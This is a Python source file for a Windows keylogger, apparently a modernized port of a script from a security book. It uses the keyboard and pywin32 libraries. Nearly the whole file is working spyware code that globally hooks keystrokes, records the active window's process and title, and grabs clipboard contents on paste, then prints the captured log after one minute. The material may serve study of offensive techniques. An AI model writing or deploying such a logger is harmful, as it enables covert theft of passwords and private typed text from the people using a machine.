"""
    The script provided in the book uses a deprecated module 'pyWinhook' which causes some dependency issues and
    is overall unstable, attempting to install it also caused issues. Therefore, we had to port the main script into
    a more modernized version using the 'Keyboard' module to hook the keyboard and the 'pywin32' module
    (win32gui, win32process, win32api) for window/process introspection.
    Run the following to get all modules: pip install keyboard pywin32 psutil
    Note: These libraries are only installed on a Windows machine.
"""
import sys
import time
import threading
from io import StringIO # In-memory buffer to store logs as a string.

# From pywin32, used to get active window and process details.
import win32gui
import win32process
import win32api
import win32clipboard

import psutil           # Used to get process name from a PID.
import keyboard         # Hooks and listens to global keyboard events.

TIMEOUT = 60 * 1  # 1 minute before printing captured results.

class KeyLogger:
    def __init__(self):
        self.current_window = None
        # log_buffer will collect keystrokes in memory (no file I/O).
        self.log_buffer = StringIO()
        self.last_window_info = None

    def get_current_process(self):
        # Handles the window.
        hwnd = win32gui.GetForegroundWindow()
        # Get the Process ID of the window at hand.
        pid = win32process.GetWindowThreadProcessId(hwnd)[1]
        try:
            proc = psutil.Process(pid)
            executable = proc.name()
        except Exception:
            executable = "unknown"
        window_title = win32gui.GetWindowText(hwnd)
        self.last_window_info = (pid, executable, window_title)
        self.current_window = window_title
        self.log_buffer.write(
            f"\n[ PID: {pid} - {executable} - {window_title} ]\n"
        )

    def log_keystroke(self, event):
        # Update window info if changed
        win_name = win32gui.GetWindowText(win32gui.GetForegroundWindow())
        if win_name != self.current_window:
            self.get_current_process()

        # Key event handling
        if event.event_type == "down":
            # ASCII printable
            try:
                char = event.name
                if len(char) == 1 and ord(char) >= 32 and ord(char) < 127:
                    self.log_buffer.write(char)
                elif char.lower() == "v" and (keyboard.is_pressed('ctrl') or keyboard.is_pressed('command')):
                    # Clipboard paste
                    win32clipboard.OpenClipboard()
                    try:
                        value = win32clipboard.GetClipboardData()
                        self.log_buffer.write(f"[PASTE] - {value}")
                    except Exception:
                        self.log_buffer.write("[PASTE] - (failed to read clipboard)")
                    win32clipboard.CloseClipboard()
                else:
                    self.log_buffer.write(f"[{char}]")
            except Exception as e:
                self.log_buffer.write(f"[ERROR: {e}]")

    def start(self):
        self.get_current_process()
        keyboard.hook(self.log_keystroke)

        start_time = time.time()
        while time.time() - start_time < TIMEOUT:
            time.sleep(0.1)
        keyboard.unhook_all()

        return self.log_buffer.getvalue()

if __name__ == "__main__":
    kl = KeyLogger()
    log = kl.start()
    print(log)
    print("done.")
